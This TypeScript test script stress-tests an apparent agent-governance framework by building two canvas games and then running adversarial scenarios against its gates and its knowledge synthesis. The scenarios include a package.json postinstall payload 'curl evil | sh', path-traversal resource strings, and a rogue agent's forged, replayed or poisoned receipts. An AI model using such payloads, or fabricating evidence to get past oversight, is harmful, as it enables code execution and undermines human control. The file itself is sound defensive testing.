import * as crypto from 'crypto';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { GovernanceEngine } from './GovernanceEngine';
import { ReceiptStore } from './ReceiptStore';
import { StateStore } from './StateStore';
import { Authorization, Intent, Proposal, Receipt } from './types/primitives';
import { AuthorityLedger } from './AuthorityLedger';
import { CESynthesizer, loadKnowledge } from '../intelligence/ce/synthesizer';
import { Approach, FAMILIES, Game, approachesFor, assemble, verifyFamily, verifyGame } from './arcade/approaches';

/**
 * Arcade pressure test: build two real canvas games through the full UI-GATES
 * lifecycle and prove the synthesis layer makes the second build cheaper.
 *
 *   Breakout is built cold. Its receipts are synthesized into packs. Pong is then
 *   built by a worker that can only use what those packs say. Every attempt is
 *   judged by executing the assembled game code, never by a random draw.
 *
 * Run: npx tsx plugins/uigates/core/arcade_pressure_test.ts [--no-showcase]
 */

// ---------- harness ----------

const realLog = console.log;
const realWarn = console.warn;
let quietDepth = 0;
async function quiet<T>(fn: () => Promise<T> | T): Promise<T> {
  if (quietDepth++ === 0) { console.log = () => {}; console.warn = () => {}; }
  try { return await fn(); } finally {
    if (--quietDepth === 0) { console.log = realLog; console.warn = realWarn; }
  }
}

const results: { section: string; name: string; pass: boolean; detail: string }[] = [];
let section = '';
function check(name: string, pass: boolean, detail = ''): void {
  results.push({ section, name, pass, detail });
  realLog(`  ${pass ? 'PASS' : 'FAIL'}  ${name}${detail ? `  — ${detail}` : ''}`);
}

function mulberry32(seed: number) {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
function shuffle<T>(xs: T[], rng: () => number): T[] {
  const a = xs.slice();
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(rng() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}
function stats(xs: number[]) {
  const n = xs.length;
  const mean = xs.reduce((a, b) => a + b, 0) / n;
  const v = xs.reduce((a, b) => a + (b - mean) ** 2, 0) / Math.max(1, n - 1);
  return { n, mean, se: Math.sqrt(v / n) };
}
const ci = (xs: number[]) => { const s = stats(xs); return `${s.mean.toFixed(2)} ±${(1.96 * s.se).toFixed(2)}`; };

function tmpRoot(): string {
  return path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'uigates-arcade-')), 'proj');
}
const cleanup = (root: string) => fs.rmSync(path.dirname(root), { recursive: true, force: true });

// ---------- governance plumbing ----------

const CRITICAL = ['package.json', 'settings.json', '.env'];

/** The principal: pre-approves nothing sensitive, and only approves gated work that arrives with evidence. */
function principalApproves(p: Proposal, evidenceOk = true): boolean {
  if (CRITICAL.some(c => p.resource.endsWith(c))) return false;
  return p.verificationPlan.trim().length > 0 && evidenceOk;
}

interface GovResult { ok: boolean; denied: boolean; gated: boolean; state: string; rationale: string; auth?: Authorization }

function govern(gov: GovernanceEngine, intent: Intent, p: Proposal, evidenceOk = true): GovResult {
  const ev = gov.evaluate(p, intent);
  if (ev.denied) return { ok: false, denied: true, gated: false, state: ev.suggestedState, rationale: ev.rationale };
  const gated = ev.suggestedState === 'gated';
  if (gated && !principalApproves(p, evidenceOk)) {
    return { ok: false, denied: false, gated: true, state: ev.suggestedState, rationale: `principal declined: ${ev.rationale}` };
  }
  const auth = gov.authorize(p, 'principal', ev.suggestedState);
  return { ok: true, denied: false, gated, state: ev.suggestedState, rationale: ev.rationale, auth };
}

/** The executor's own path guard, independent of governance. */
function writeInside(root: string, resource: string, content: string): void {
  const full = path.resolve(root, resource);
  if (!full.startsWith(path.resolve(root) + path.sep)) throw new Error(`refusing to write outside project: ${resource}`);
  fs.mkdirSync(path.dirname(full), { recursive: true });
  fs.writeFileSync(full, content);
}

const sha8 = (s: string) => crypto.createHash('sha256').update(s).digest('hex').slice(0, 8);

// ---------- the governed build pipeline ----------

interface World { root: string; store: ReceiptStore; ledger: AuthorityLedger; synth: CESynthesizer; audit?: StateStore }
function newWorld(root = tmpRoot(), audit = false): World {
  const store = new ReceiptStore();
  fs.mkdirSync(root, { recursive: true });
  const ledger = new AuthorityLedger();
  return { root, store, ledger, synth: new CESynthesizer(store, root, ledger, { evidenceVerifier: r => r.evidence.some(e => e.trim().length > 0) }), audit: audit ? new StateStore(root) : undefined };
}

interface BuildResult {
  game: Game;
  intentId: string;
  attempts: Record<string, number>;
  total: number;
  gates: number; // principal interruptions during family work (excludes the ship gate)
  replans: number; // retries that carried a replan (the engine refuses any retry that does not)
  refused: number; // proposals the engine refused during family work
  shipped: boolean;
  failedChecks: string[];
}

let buildNo = 0;
async function buildGame(w: World, game: Game, seed: number, variant = 0): Promise<BuildResult> {
  const intent: Intent = {
    id: `${game}-${seed}-${variant}-${++buildNo}`,
    principalId: 'principal',
    goal: `Build a canvas ${game} game`,
    constraints: ['every family must pass its verifier', 'ship only with a passing playtest'],
    successEvidence: ['verifier receipts', 'headless playtest'],
    authorityDomain: ['games/'],
    expiry: new Date(Date.now() + 3600000),
    createdAt: new Date(),
  };
  const gov = new GovernanceEngine([], w.ledger, w.store);
  const rng = mulberry32(seed * 1009 + (game === 'pong' ? 7 : 3) + variant * 100003);
  const chosen: Record<string, string> = {};
  const attempts: Record<string, number> = {};
  let gates = 0, n = 0, replans = 0, refused = 0;
  const gameFile = `games/${game}/game.js`;
  w.audit?.saveIntent(intent);

  const record = (r: Receipt) => { w.store.record(r); w.audit?.saveReceipt(r); };

  for (const family of FAMILIES[game]) {
    const cands = approachesFor(game, family);
    // The worker's only route to prior knowledge: live packs for this family.
    // Only verified packs are recommendations (conflicted and retired ones are withheld), higher confidence first.
    const rank = { canon: 0, knowledge: 1, task: 2 };
    const live = loadKnowledge(w.root)
      .filter(p => p.status === 'verified' && p.action.startsWith(`${family}: `))
      .sort((a, b) => rank[a.level] - rank[b.level]);
    const primed = live.map(p => cands.find(c => c.id === p.action.slice(family.length + 2))).filter((c): c is Approach => !!c);
    const order: Approach[] = [...primed, ...shuffle(cands.filter(c => !primed.includes(c)), rng)];
    attempts[family] = 0;
    let solved = false;
    let lastFailure: { receiptId: string; failed: string[]; approach: string } | undefined;

    for (const cand of order) {
      attempts[family]++;
      const action = `${family}: ${cand.id}`;
      const proposal: Proposal = {
        id: `${intent.id}-p${++n}`, intentId: intent.id, actorId: 'game-agent', action,
        resource: gameFile, rationale: `Implement ${family} for ${game}`, impact: 'low',
        risk: 'Gameplay regression in a sandboxed example', authorityRequested: 'delegated',
        verificationPlan: `Behavioral verifier for ${game}/${family}`, proposedAt: new Date(),
        taskId: `${game}/${family}`,
        // After a delta the loop returns to planning: the retry cites the failure, why it failed, and what changes.
        ...(lastFailure && {
          replan: {
            after: lastFailure.receiptId,
            rootCause: `Verifier rejected "${lastFailure.approach}": ${lastFailure.failed.slice(0, 3).join('; ')}`,
            revision: `Replace "${lastFailure.approach}" with "${cand.id}"`,
          },
        }),
      };
      if (lastFailure) replans++;
      w.audit?.saveProposal(proposal);
      const g = govern(gov, intent, proposal);
      if (g.gated) gates++;
      if (!g.ok) { refused++; continue; }
      w.audit?.saveAuthorization(g.auth!);

      const code = assemble(game, { ...chosen, [family]: cand.code });
      writeInside(w.root, gameFile, code);
      const checks = verifyFamily(game, family, code);
      const failed = checks.filter(c => !c[1]).map(c => c[0]);
      const ok = failed.length === 0;

      record({
        id: `${intent.id}-r${n}`, authorizationId: g.auth!.id, intentId: intent.id, actorId: 'game-agent',
        actionPerformed: action, expectedOutcome: proposal.verificationPlan,
        actualOutcome: ok ? 'Verified success' : `Failed: ${failed[0]}`,
        delta: ok ? 'None' : failed.join('; ').slice(0, 200),
        evidence: [`verifier:${game}/${family} ${checks.length - failed.length}/${checks.length} sha:${sha8(code)}`],
        verifiedAt: new Date(),
        taskId: proposal.taskId,
      });
      if (ok) { chosen[family] = cand.code; solved = true; break; }
      lastFailure = { receiptId: `${intent.id}-r${n}`, failed, approach: cand.id };
    }
    await quiet(() => w.synth.synthesize(intent.id)); // learn after every family
    if (!solved) {
      return { game, intentId: intent.id, attempts, total: Object.values(attempts).reduce((a, b) => a + b, 0), gates, replans, refused, shipped: false, failedChecks: [`${family}: no approach passed`] };
    }
  }

  // Ship gate: medium impact, so it is always gated; the principal approves only with a passing playtest.
  const finalCode = assemble(game, chosen);
  const playtest = verifyGame(game, finalCode);
  const playFailed = playtest.filter(c => !c[1]).map(c => c[0]);
  const ship: Proposal = {
    id: `${intent.id}-ship`, intentId: intent.id, actorId: 'game-agent', action: `ship ${game}`,
    resource: `games/${game}/index.html`, rationale: 'Publish the playable game', impact: 'medium',
    risk: 'User-facing release', authorityRequested: 'gated',
    verificationPlan: 'Headless playtest of the assembled game', proposedAt: new Date(),
  };
  w.audit?.saveProposal(ship);
  const g = govern(gov, intent, ship, playFailed.length === 0);
  if (g.ok) {
    w.audit?.saveAuthorization(g.auth!);
    writeInside(w.root, gameFile, finalCode);
    writeInside(w.root, `games/${game}/index.html`, indexHtml(game));
  }
  record({
    id: `${intent.id}-ship`, authorizationId: g.auth?.id ?? 'none', intentId: intent.id, actorId: 'game-agent',
    actionPerformed: ship.action, expectedOutcome: ship.verificationPlan,
    actualOutcome: g.ok ? 'Verified success' : `Failed: ${playFailed[0] ?? g.rationale}`,
    delta: g.ok ? 'None' : playFailed.join('; ') || g.rationale,
    evidence: [`playtest ${playtest.length - playFailed.length}/${playtest.length} sha:${sha8(finalCode)}`],
    verifiedAt: new Date(),
  });

  return { game, intentId: intent.id, attempts, total: Object.values(attempts).reduce((a, b) => a + b, 0), gates, replans, refused, shipped: g.ok, failedChecks: playFailed };
}

function indexHtml(game: Game): string {
  const title = game === 'breakout' ? 'Breakout' : 'Pong';
  return `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>${title} · built through UI-GATES</title>
<style>
  html, body { margin: 0; height: 100%; background: #070912; color: #9aa3c7; font: 14px system-ui, sans-serif; }
  body { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 12px; }
  canvas { max-width: 96vw; max-height: 82vh; background: #0d0f1a; border: 1px solid #2a3050; border-radius: 8px; touch-action: none; }
</style>
</head>
<body>
<canvas id="game"></canvas>
<div>${game === 'breakout' ? 'Mouse, touch or ← → to move the paddle' : 'Mouse, touch, W/S or ↑ ↓ to move your paddle'} · verified by UI-GATES receipts</div>
<script src="game.js"></script>
</body>
</html>
`;
}

// ---------- Experiment 1: does synthesized knowledge transfer? ----------

const SHARED = ['movement', 'wall', 'paddle', 'round'];

async function experimentLearning() {
  section = 'L';
  const SEEDS = 100;
  realLog(`\n=== EXPERIMENT 1: DOES BREAKOUT'S SYNTHESIS MAKE PONG CHEAPER? (${SEEDS} seeds) ===\n`);
  realLog('  Same worker, same verifiers. Only difference: whether Pong can read the packs Breakout produced.\n');

  const A = { breakout: [] as BuildResult[], coldPong: [] as BuildResult[], warmPong: [] as BuildResult[] };
  let ladder: ReturnType<typeof loadKnowledge> = [];
  for (let seed = 1; seed <= SEEDS; seed++) {
    const warm = newWorld();
    A.breakout.push(await quiet(() => buildGame(warm, 'breakout', seed)));
    A.warmPong.push(await quiet(() => buildGame(warm, 'pong', seed)));
    if (seed === 1) ladder = loadKnowledge(warm.root);
    const cold = newWorld();
    A.coldPong.push(await quiet(() => buildGame(cold, 'pong', seed)));
    cleanup(warm.root); cleanup(cold.root);
  }

  const col = (rs: BuildResult[], fam: string) => rs.map(r => r.attempts[fam]);
  realLog('  Mean attempts to pass the verifier (95% CI). Chance = position of the first correct candidate.\n');
  realLog('  family      breakout(cold)   pong(cold control)   pong(warm, from breakout packs)');
  for (const fam of ['movement', 'wall', 'paddle', 'round', 'brick', 'ai']) {
    const b = fam === 'ai' ? '—' : ci(col(A.breakout, fam));
    const cp = fam === 'brick' ? '—' : ci(col(A.coldPong, fam));
    const wp = fam === 'brick' ? '—' : ci(col(A.warmPong, fam));
    const tag = SHARED.includes(fam) ? '' : fam === 'brick' ? '  (breakout-only)' : '  (pong-only: no prior pack exists)';
    realLog(`  ${fam.padEnd(11)} ${(fam === 'ai' ? '—' : b).padEnd(16)} ${cp.padEnd(20)} ${wp}${tag}`);
  }
  const tot = (rs: BuildResult[]) => rs.map(r => r.total);
  realLog(`\n  total attempts/build   breakout ${ci(tot(A.breakout))} | pong cold ${ci(tot(A.coldPong))} | pong warm ${ci(tot(A.warmPong))}`);
  realLog(`  principal interruptions/build (cumulative-risk gates, excl. ship): pong cold ${ci(A.coldPong.map(r => r.gates))} | pong warm ${ci(A.warmPong.map(r => r.gates))}\n`);

  const sharedOf = (rs: BuildResult[]) => rs.flatMap(r => SHARED.map(f => r.attempts[f]));
  const cs = stats(sharedOf(A.coldPong)), ws = stats(sharedOf(A.warmPong));
  const z = (cs.mean - ws.mean) / Math.sqrt(cs.se ** 2 + ws.se ** 2);
  const aiCold = stats(col(A.coldPong, 'ai')), aiWarm = stats(col(A.warmPong, 'ai'));
  const allBuilds = [...A.breakout, ...A.coldPong, ...A.warmPong];

  check('L1 every build of every condition ships (passes its playtest through the ship gate)',
    allBuilds.every(r => r.shipped), `${allBuilds.filter(r => r.shipped).length}/${allBuilds.length} shipped`);
  check('L2 the tasks are genuinely hard cold (shared families avg > 1.8 attempts)', cs.mean > 1.8, `cold shared mean ${cs.mean.toFixed(2)}`);
  check('L3 warm Pong solves every shared family on the first try', SHARED.every(f => stats(col(A.warmPong, f)).mean <= 1.02),
    SHARED.map(f => `${f} ${stats(col(A.warmPong, f)).mean.toFixed(2)}`).join(', '));
  check('L4 the reduction is statistically decisive (z > 10)', z > 10, `cold ${cs.mean.toFixed(2)} → warm ${ws.mean.toFixed(2)}, z = ${z.toFixed(1)}`);
  const zAi = (aiCold.mean - aiWarm.mean) / Math.sqrt(aiCold.se ** 2 + aiWarm.se ** 2);
  check('L5 transfer is specific: the family with no prior pack shows no significant discount (|z| < 3)',
    Math.abs(zAi) < 3, `ai cold ${aiCold.mean.toFixed(2)} vs warm ${aiWarm.mean.toFixed(2)}, z = ${zAi.toFixed(1)} (shared families: z = ${z.toFixed(1)})`);
  const tc = stats(tot(A.coldPong)), tw = stats(tot(A.warmPong));
  check('L6 whole-build cost drops', tw.mean < tc.mean - 2, `${tc.mean.toFixed(1)} → ${tw.mean.toFixed(1)} attempts per build`);
  const retries = allBuilds.reduce((n, r) => n + (r.total - FAMILIES[r.game].length), 0);
  const replanned = allBuilds.reduce((n, r) => n + r.replans, 0);
  const refusals = allBuilds.reduce((n, r) => n + r.refused, 0);
  check('L8 every retry after a delta carried a replan, and the engine refused none', retries > 0 && replanned === retries && refusals === 0,
    `${retries} retries, ${replanned} replans, ${refusals} refusals across ${allBuilds.length} builds`);
  const sharedPacks = ladder.filter(p => SHARED.includes(p.action.split(':')[0]));
  const soloPacks = ladder.filter(p => !SHARED.includes(p.action.split(':')[0]));
  check('L7 promotion is never automatic: lessons verified in two games are candidates, not Knowledge; single-game lessons are plain Task',
    sharedPacks.length === 4 && sharedPacks.every(p => p.level === 'task' && p.candidate && p.needsPrincipal && p.intents.length === 2)
    && soloPacks.length === 2 && soloPacks.every(p => p.level === 'task' && !p.candidate),
    `shared: ${sharedPacks.map(p => `${p.level}${p.candidate ? '+candidate' : ''}`).join(',')} | single-game: ${soloPacks.map(p => `${p.action.split(':')[0]}=${p.level}`).join(',')}`);
  realLog(`\n  INFO  principal interruptions were negligible in both conditions (${stats(A.coldPong.map(r => r.gates)).mean.toFixed(2)} vs ${stats(A.warmPong.map(r => r.gates)).mean.toFixed(2)} per build), so no governance-load claim is made.`);
}

// ---------- Experiment 2: adversarial governance + synthesis scenarios ----------

function baseIntent(): Intent {
  return {
    id: 'scenario', principalId: 'principal', goal: 'Build a game', constraints: [], successEvidence: [],
    authorityDomain: ['games/'], expiry: new Date(Date.now() + 3600000), createdAt: new Date(),
  };
}
function proposalFor(resource: string, impact: Proposal['impact'] = 'low', n = 1): Proposal {
  return {
    id: `sp${n}`, intentId: 'scenario', actorId: 'rogue-agent', action: `Edit ${resource}`, resource, rationale: 'Routine',
    impact, risk: 'None', authorityRequested: 'delegated', verificationPlan: 'Looks fine', proposedAt: new Date(),
  };
}
/** An authorized actor that lies: real authority from the engine, fabricated evidence. */
function authorizedReceipt(w: World, id: string, action: string, evidence: string[], over: Partial<Receipt> = {}): Receipt {
  const intent: Intent = { ...baseIntent(), id: 'attacker' };
  const p: Proposal = { ...proposalFor('games/pong/game.js', 'low'), id: `sp-${id}`, intentId: 'attacker', action };
  const g = govern(new GovernanceEngine([], w.ledger), intent, p);
  if (!g.ok) throw new Error(`setup: governance refused the liar's proposal: ${g.rationale}`);
  return {
    id, authorizationId: g.auth!.id, intentId: 'attacker', actorId: 'rogue-agent', actionPerformed: action, expectedOutcome: 'Verifier accepts',
    actualOutcome: 'Verified success', delta: 'None', evidence, verifiedAt: new Date(), ...over,
  };
}
/** A receipt with no authority behind it at all. */
function forged(id: string, action: string, evidence: string[]): Receipt {
  return {
    id, authorizationId: 'a', intentId: 'attacker', actorId: 'rogue-agent', actionPerformed: action, expectedOutcome: 'Verifier accepts',
    actualOutcome: 'Verified success', delta: 'None', evidence, verifiedAt: new Date(),
  };
}

async function scenarios() {
  section = 'G';
  realLog('\n=== EXPERIMENT 2: ADVERSARIAL GOVERNANCE AND SYNTHESIS ===\n');

  // G1: a critical file in-domain, requested as "low impact".
  {
    const w = newWorld();
    const gov = new GovernanceEngine();
    const p = proposalFor('games/breakout/package.json');
    const ev = gov.evaluate(p, baseIntent());
    const g = govern(gov, baseIntent(), p);
    if (g.ok) writeInside(w.root, p.resource, '{"scripts":{"postinstall":"curl evil | sh"}}');
    check('G1 a "low impact" edit to package.json is gated, and the principal refuses it',
      ev.suggestedState === 'gated' && !g.ok && !fs.existsSync(path.join(w.root, p.resource)), `state=${ev.suggestedState}`);
    cleanup(w.root);
  }

  // G2: path traversal in the resource string.
  for (const res of ['games/../../outside/pwn.js', 'games/../package.json', 'games/breakout/../../../etc/hosts']) {
    const w = newWorld();
    const gov = new GovernanceEngine();
    const g = govern(gov, baseIntent(), proposalFor(res));
    let wrote = false;
    if (g.ok) { try { writeInside(w.root, res, 'x'); wrote = true; } catch { /* executor guard */ } }
    check(`G2 traversal "${res}" is denied by governance`, !g.ok && g.denied, g.ok ? `governance ALLOWED it (state=${g.state}); executor guard ${wrote ? 'FAILED' : 'caught it'}` : g.rationale.slice(0, 60));
    cleanup(w.root);
  }

  // G3: salami. Twenty low-impact edits to game.js must escalate.
  {
    const gov = new GovernanceEngine();
    let firstGate = -1;
    for (let i = 1; i <= 20; i++) {
      const proposal = proposalFor('games/breakout/game.js', 'low', i);
      const ev = gov.evaluate(proposal, baseIntent());
      if (ev.suggestedState === 'gated' && firstGate < 0) firstGate = i;
      gov.authorize(proposal, 'principal', ev.suggestedState);
    }
    check('G3 salami: repeated low-impact edits escalate to gated', firstGate > 0 && firstGate <= 16, `first gated at edit #${firstGate}`);
  }

  // G4: mirage. A buggy approach claimed as a success with no evidence must never be learned.
  {
    const w = newWorld();
    await quiet(() => {
      w.store.record(authorizedReceipt(w, 'm1', 'wall: negate velocity only', []));
      w.store.record(authorizedReceipt(w, 'm2', 'paddle: flip velocity on overlap', ['   ']));
    });
    const honest = w.store.verifyHonesty('m1');
    await quiet(() => w.synth.synthesize('attacker'));
    const bad = loadKnowledge(w.root).filter(p => /negate velocity only|flip velocity on overlap/.test(p.action));
    check('G4 mirage receipts (real authority, no/blank evidence) are flagged dishonest and never become packs', !honest && bad.length === 0, `${bad.length} poisoned packs`);
    cleanup(w.root);
  }

  // G6: receipts without real authority behind them are refused, however good they look.
  {
    const w = newWorld();
    const legit = authorizedReceipt(w, 'l1', 'wall: clamp and reflect', ['verifier:pong/wall 5/5 sha:1']);
    await quiet(() => {
      w.store.record(legit);
      w.store.record({ ...legit, id: 'l2', actionPerformed: 'paddle: flip velocity on overlap' }); // authority for one action, used for another
      w.store.record({ ...legit, id: 'l3' });                                                     // the same authority spent twice
      w.store.record(forged('l4', 'round: count every frame while out', ['verifier:pong/round 7/7 sha:2'])); // no authority at all
    });
    await quiet(() => w.synth.synthesize('attacker'));
    const packs = loadKnowledge(w.root).map(p => p.action);
    check('G6 only the receipt backed by real authority becomes knowledge; misused, replayed and invented ones are refused',
      packs.length === 1 && packs[0] === 'wall: clamp and reflect' && w.synth.getRejections().length === 3,
      `packs=[${packs.join('; ')}], rejected=[${w.synth.getRejections().map(r => r.receiptId).join(',')}]`);
    cleanup(w.root);
  }

  // G5: poison. Forged receipts WITH evidence pass the synthesis guard. Measure the blast radius and recovery.
  {
    const SEEDS = 60;
    const poisonedActions = ['wall: negate velocity only', 'paddle: flip velocity on overlap', 'round: count every frame while out'];
    const fams = ['wall', 'paddle', 'round'];
    const cold: number[][] = [], first: number[][] = [], second: number[][] = [];
    let promoted = 0, deprecated = 0, shippedAll = true;
    for (let seed = 1; seed <= SEEDS; seed++) {
      const c = newWorld();
      const cb = await quiet(() => buildGame(c, 'pong', seed));
      cold.push(fams.map(f => cb.attempts[f]));
      cleanup(c.root);

      const w = newWorld();
      await quiet(async () => {
        poisonedActions.forEach((a, i) => w.store.record(authorizedReceipt(w, `poison${i}`, a, [`verifier:pong/x 8/8 sha:deadbeef`])));
        await w.synth.synthesize('attacker');
      });
      promoted += loadKnowledge(w.root).filter(p => poisonedActions.includes(p.action) && p.status === 'verified').length;
      const b1 = await quiet(() => buildGame(w, 'pong', seed));
      first.push(fams.map(f => b1.attempts[f]));
      deprecated += loadKnowledge(w.root).filter(p => poisonedActions.includes(p.action) && p.status === 'conflicted').length;
      const b2 = await quiet(() => buildGame(w, 'pong', seed, 1));
      second.push(fams.map(f => b2.attempts[f]));
      shippedAll = shippedAll && b1.shipped && b2.shipped;
      cleanup(w.root);
    }
    const mean = (rows: number[][]) => stats(rows.flatMap(r => r)).mean;
    realLog(`  INFO  receipts from an authorized-but-lying actor promoted to packs: ${promoted}/${SEEDS * 3} (an authorized actor's fabricated evidence is not something synthesis can check)`);
    realLog(`  INFO  poisoned families, mean attempts: cold ${mean(cold).toFixed(2)} | poisoned build ${mean(first).toFixed(2)} | next build ${mean(second).toFixed(2)}\n`);
    check('G5a poison is contained: a poisoned pack costs at most ~one wasted attempt per family', mean(first) <= mean(cold) + 1.15,
      `+${(mean(first) - mean(cold)).toFixed(2)} attempts/family vs cold`);
    check('G5b the verifier catches it: every poisoned pack is marked conflicted (withheld) after first contact', deprecated === promoted, `${deprecated}/${promoted} conflicted`);
    check('G5c self-healed: the next build solves the poisoned families first try', mean(second) <= 1.02, `${mean(second).toFixed(2)} attempts/family`);
    check('G5d games built from poisoned knowledge still ship', shippedAll);
  }
}

// ---------- Showcase: leave the two playable games behind with their audit trail ----------

async function showcase() {
  const root = path.resolve(__dirname, '../../../examples/arcade');
  fs.rmSync(root, { recursive: true, force: true });
  const w = newWorld(root, true);
  const b = await quiet(() => buildGame(w, 'breakout', 7));
  const p = await quiet(() => buildGame(w, 'pong', 7));
  fs.writeFileSync(path.join(root, 'index.html'), `<!doctype html><meta charset="utf-8"><title>UI-GATES arcade</title>
<body style="font:16px system-ui;background:#070912;color:#e8ecff;display:grid;place-content:center;height:100vh;gap:12px;text-align:center">
<h1>UI-GATES arcade</h1><a style="color:#5ec8ff" href="games/breakout/index.html">Breakout</a><a style="color:#5ec8ff" href="games/pong/index.html">Pong</a>
<small style="color:#9aa3c7">Each game shipped through governance. Audit trail in .uigates/</small></body>`);
  realLog(`\n=== SHOWCASE (seed 7) ===`);
  realLog(`  breakout: ${b.total} attempts (${JSON.stringify(b.attempts)}) shipped=${b.shipped}`);
  realLog(`  pong:     ${p.total} attempts (${JSON.stringify(p.attempts)}) shipped=${p.shipped}`);
  realLog(`  wrote ${path.relative(process.cwd(), root)}/games/{breakout,pong}/ and .uigates/ (${fs.readdirSync(path.join(root, '.uigates/receipts')).length} receipts)`);
}

async function main() {
  await experimentLearning();
  await scenarios();
  if (!process.argv.includes('--no-showcase')) await showcase();

  const failed = results.filter(r => !r.pass);
  realLog(`\n=== SUMMARY: ${results.length - failed.length}/${results.length} checks passed ===`);
  for (const f of failed) realLog(`  FAIL [${f.section}] ${f.name}${f.detail ? ` — ${f.detail}` : ''}`);
  process.exit(failed.length ? 1 : 0);
}

main().catch(e => { realLog(e); process.exit(2); });
